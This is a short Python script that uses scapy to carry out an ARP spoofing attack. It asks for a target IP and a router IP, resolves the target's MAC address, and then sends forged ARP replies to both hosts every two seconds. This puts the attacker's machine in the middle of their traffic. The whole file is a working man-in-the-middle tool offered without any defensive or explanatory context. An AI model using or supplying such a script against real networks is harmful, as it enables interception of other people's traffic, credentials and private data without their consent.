#!/usr/bin/env python

import scapy.all as scapy
import time

print("Enter The Following Values.. and to stop the program just press CTRL+C")
target_ip = input("Type the target ip > ")
spoof_ip = input("Type the ip of your router > ")
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    return answered_list[0][1].hwsrc
    
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)

while True:
    spoof(target_ip, spoof_ip)
    spoof(spoof_ip, target_ip)
    time.sleep(2)
